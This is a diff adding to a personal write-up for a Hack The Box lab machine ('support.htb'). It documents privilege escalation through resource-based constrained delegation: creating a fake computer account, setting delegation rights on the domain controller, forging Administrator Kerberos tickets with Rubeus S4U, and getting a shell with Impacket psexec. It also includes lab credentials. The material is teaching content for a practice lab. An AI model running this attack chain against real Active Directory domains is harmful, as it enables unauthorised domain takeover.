@@ -1,3 +1,5 @@
+![[Pasted image 20250624092931.png]]
+
 # Enumeration
 
 Look what ports are opens
@@ -191,6 +193,12 @@ evil-winrm -u "support" -p "Ironside47pleasure40Watchful" --ip support.htb
 ```
 ![[Pasted image 20250622105158.png]]
 
+![[Pasted image 20250624074629.png]]
+
+
+
+# Privilege Escalation
+
 ## Setup bloodhound env
 
 ```bash
@@ -201,11 +209,189 @@ sudo docker-compose pull && sudo docker-compose up
 ![[Pasted image 20250624000703.png]]
 
 
+https://breachar.medium.com/install-bloodhound-ce-under-kali-linux-2024-4-2a68feebdb62
+## Resource Based Constrained Delegation
+
+### MachineAccountQuota Get-ADObject
+
+```bash
+Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota
+```
+![[Pasted image 20250624074915.png]]
+### MachineAccountQuota LDAP
+
 LDAP query to extract the `ms-DS-MachineAccountQuota` from the domain class.
 ```bash
 ldapsearch -H LDAP://support.htb -D ldap@support.htb -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" "(ObjectClass=domainDNS)" ms-DS-MachineAccountQuota
 ```
 
 
+import the `PowerView.ps1` module on the target machine.
+```bash
+upload PowerView.ps1
+```
 
-https://breachar.medium.com/install-bloodhound-ce-under-kali-linux-2024-4-2a68feebdb62
+![[Pasted image 20250624075537.png]]
+Once do that we need to verify if the `msds-allowedtoactonbehalfofotheridentity` attribute is empty
+
+```bash
+Get-DomainComputer DC | select name,  msds-allowedtoactonbehalfofotheridentity
+```
+
+![[Pasted image 20250624075948.png]]
+
+The value is empty, which means we are ready to perform the ***RBCD attack***, but first let's upload the tools
+that are required. We will need [PowerMad](https://github.com/Kevin-Robertson/Powermad) and [Rubeus](https://github.com/GhostPack/Rubeus), which we can upload using Evil-WinRM as shown
+previously.
+
+Import Powermad.ps1
+```bash
+upload Powermad.ps1
+```
+
+#### Creating a Computer Object
+Now, let's create a fake computer and add it to the domain. We can use PowerMad's New-MachineAccount
+to achieve this.
+```bash
+New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
+```
+
+![[Pasted image 20250624081609.png]]
+
+We can verify this new machine with the following command
+```bash
+Get-ADComputer -identity FAKE-COMP01
+```
+
+![[Pasted image 20250624081801.png]]
+in the output we can see the `SID` of this object.
+
+#### Configure RBCD
+
+Next, we will need to configure Resource-Based Constrained Delegation through one of two ways. We can
+either set the PrincipalsAllowedToDelegateToAccount value to FAKE-COMP01 through the builtin
+PowerShell Active Directory module, which will in turn configure the msds-
+allowedtoactonbehalfofotheridentity attribute on its own, or we can use the PowerView module to
+directly set the msds-allowedtoactonbehalfofotheridentity attribute
+
+```bash
+Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$
+```
+
+To verify if the command above worked we can use the `Get-ADComputer` command
+
+```bash
+et-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount
+```
+
+![[Pasted image 20250624082211.png]]
+
+As we can see, the `PrincipalsAllowedToDelegateToAccount` is set to FAKE-COMP01 , which means the
+command worked. 
+We can also verify the value of the` msds-allowedtoactonbehalfofotheridentity`.
+
+```bash
+Get-DomainComputer -Identity DC | select msds-allowedtoactonbehalfofotheridentity
+```
+
+![[Pasted image 20250624082453.png]]
+
+As we can see, the `msds-allowedtoactonbehalfofotheridentity` now has a value, but because the type
+of this attribute is `Raw Security Descriptor` we will have to convert the bytes to a string to understand
+what's going on.
+
+First, let's grab the desired value and dump it to a variable called **RawBytes**.
+```bash
+$RawBytes = Get-DomainComputer -Identity DC -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
+```
+
+Then, let's convert these bytes to a Raw Security Descriptor object.
+```bash
+$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes,0
+```
+
+Finally, we can print both the entire security descriptor, as well as the `DiscretionaryAcl` class, **which
+represents the Access Control List that specifies the machines that can act on behalf of the DC**
+
+```bash
+$Descriptor
+$Descriptor.DiscretionaryAcl
+```
+
+![[Pasted image 20250624083156.png]]
+From the output we can see that the `SecurityIdentifier` is set to the SID of `FAKE-COMP01` that we saw
+earlier, and the `AceType` is set to `AccessAllowed` 
+
+### Performing a S4U Attack
+t is now time to perform the S4U attack, which will allow us to obtain a Kerberos ticket on behalf of the
+Administrator. We will be using Rubeus to perform this attack.
+First, we will need the hash of the password that was used to create the computer object.
+
+```bash
+upload Rubeus.exe
+
+.\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb
+```
+
+![[Pasted image 20250624085040.png]]
+
+We need to grab the value called `rc4_hmac` . Next, we can generate **Kerberos tickets for the Administrator**.
+
+```powershell
+.\Rubeus.exe s4u /user:FAKE-COMP01$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:Administrator /msdsspn:cifs/
+dc.support.htb /domain:support.htb /ptt
+```
+
+
+![[Pasted image 20250624085353.png]]
+
+
+Rubeus successfuly generated the tickets. We can now grab the last Base64 encoded ticket and use it on our
+local machine to get a shell on the DC as Administrator . To do so, copy the value of the last ticket and
+paste it inside a file called `ticket.kirbi.b64 `. 
+
+> NOTE
+> Make sure to remove any whitespace characters from the value.
+
+
+```bash
+tr -d '[:space:]' < ticket.kirbi.b64 > ticket.kirbi.no.whitespace
+
+base64 -d ticket.kirbi.no.whitespace > ticket.kirbi
+```
+
+![[Pasted image 20250624090549.png]]
+
+Finally, we can convert this ticket to a format that **Impacket can use**. This can be achieved with Impackets'
+`TicketConverter.py` .
+
+```bash
+sudo python3 -m venv impacket-env
+source impacket-env/bin/activate
+```
+
+```bash
+
+sudo apt install git python3-pip -y
+git clone https://github.com/fortra/impacket.git
+cd impacket
+pip install .
+```
+
+```bash
+cd examples
+python3 ticketConverter.py ../../ticket.kirbi ../../ticket.ccache
+```
+
+
+To acquire a shell we can use Impackets' `psexec.py` .
+
+```bash
+KRB5CCNAME=../../ticket.ccache python3 psexec.py support.htb/administrator@dc.support.htb -k -no-pass
+```
+
+![[Pasted image 20250624092635.png]]
+
+find the root flag 
+
+![[Pasted image 20250624092854.png]]
